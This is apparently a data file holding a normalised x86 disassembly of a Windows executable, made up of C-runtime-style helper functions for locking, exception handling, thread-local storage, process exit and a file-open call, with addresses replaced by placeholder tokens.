push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405ee8
add esp 0x10
pop ebp
retn
sub_406163
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_40d153
pop ecx
pop ecx
retn
sub_40619d
xor eax eax
inc eax
retn
_start
call sub_40d7c8
jmp sub_406038
sub_40626b
call sub_40a128
add eax 0x20
push eax
push 0x1
call sub_40a2ae
pop ecx
pop ecx
retn
sub_40627e
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_406318
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4062ed
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_406330
push 0x8
call sub_408efb
pop ecx
retn
sub_406339
push 0x8
call sub_408e21
pop ecx
retn
sub_40651f
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_408e21
pop ecx
sub_406534
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_406408
add esp 0xc
pop ebp
retn
sub_40654a
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_406408
add esp 0xc
pop ebp
retn
sub_406560
push 0x1
push 0x0
push 0x0
call sub_406408
add esp 0xc
retn
sub_40656f
push 0x1
push 0x1
push 0x0
call sub_406408
add esp 0xc
retn
sub_40671e
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_40a2ae
pop ecx
pop ecx
retn
sub_40674d
push 0x1
call sub_408e21
pop ecx
retn
sub_406756
push 0x1
call sub_40667c
pop ecx
retn
sub_406acb
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4069a4
add esp 0xc
pop ebp
retn
sub_406c23
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406ae2
add esp 0xc
pop ebp
retn
sub_406ced
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406c3a
add esp 0x14
pop ebp
retn
sub_406fcb
push 0xd
call sub_408e21
pop ecx
retn
sub_407397
push 0xd
call sub_408e21
pop ecx
retn
sub_4073d0
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_407236
pop ecx
mov [ rw-data ] 0x1
sub_407707
push 0xc
call sub_408e21
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_407785
push 0x0
call sub_407713
pop ecx
retn
sub_407800
call [ TlsAlloc@IAT ]
retn 0x4
sub_40794f
push 0xd
call sub_408e21
pop ecx
retn
sub_407958
push 0xc
call sub_408e21
pop ecx
retn
sub_4079da
mov edi edi
push esi
call sub_407961
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push 0x10
call sub_4062c4
pop ecx
sub_407b0e
push 0xd
call sub_408e21
pop ecx
retn
sub_407b1a
push 0xc
call sub_408e21
pop ecx
retn
sub_407dc5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_408e21
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_408ef2
push 0xa
call sub_408e21
pop ecx
retn
sub_409a39
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_409dc0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40a1df
call sub_406756
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_404d8e
pop ecx
retn
call sub_40fc64
sub_40a6d5
push 0x1
call sub_408e21
pop ecx
retn
sub_40a7b6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_40a6e0
add esp 0xc
pop ebp
retn 0x4
sub_40a7e9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_4107a9
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40a81c
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_40a6e0
add esp 0xc
pop ebp
retn 0x8
sub_40b013
push [ ebp + 0x8 ]
call sub_4109e9
pop ecx
retn
sub_40bb24
push [ ebp + 0x8 ]
call sub_4109e9
pop ecx
retn
sub_40bd9c
xor eax eax
inc eax
retn
sub_40befa
push [ ebp + 0x8 ]
call sub_4109e9
pop ecx
retn
sub_40d144
push sub_40d102
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_40d152
retn
sub_40db55
call sub_406339
retn
sub_40db5b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40db1f
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_40dcbb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_40dced
push 0x8
push r--data
call sub_4099f4
call sub_4079da
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_4115a3
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_40dd0d
xor eax eax
inc eax
retn
sub_40dd26
push sub_40dced
call sub_407713
pop ecx
mov [ rw-data ] eax
retn
sub_40dd37
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_40dd8c
push [ rw-data ]
call sub_40778e
pop ecx
retn
sub_40df0d
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_408e21
pop ecx
sub_40df49
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40df58
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40df67
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40df97
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_40dfae
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_409a39
retn
push 0x8
call [ SetLastError@IAT ]
sub_40e7db
push [ ebp + 0x8 ]
call sub_4109e9
pop ecx
retn
sub_40e8bc
push [ ebp + 0x8 ]
call sub_4109e9
pop ecx
retn
sub_40f290
and [ rw-data ] 0x0
retn
sub_40f42c
push [ ebp + 0x8 ]
call sub_4109e9
pop ecx
retn
sub_40f64f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f4e3
add esp 0x14
pop ebp
retn
sub_40fcfa
push 0x1
call sub_408e21
pop ecx
retn
sub_410678
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41050e
add esp 0x10
pop ebp
retn
sub_41077d
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_4106b4
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4107c8
call eax
retn
sub_4109e0
push 0xa
call sub_408e21
pop ecx
retn
sub_410ae3
push 0xa
call sub_408e21
pop ecx
retn
sub_410ba1
push 0xb
call sub_408e21
pop ecx
retn
sub_410c90
push 0xc
push r--data
call sub_4099f4
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_409a39
retn
sub_410cad
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_410d42
call sub_410ce0
mov [ rw-data ] eax
xor eax eax
retn
sub_410f50
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_411780
sub_410f66
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_411780
sub_411472
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41135b
add esp 0x10
pop ebp
retn
sub_4114df
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_41148c
add esp 0x10
pop ebp
retn
sub_411591
push 0x4
call sub_408e21
pop ecx
retn
sub_41159a
push 0x2
call sub_4062c4
pop ecx
retn
sub_4118a7
push 0x4
call sub_408e21
pop ecx
retn
sub_411bef
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
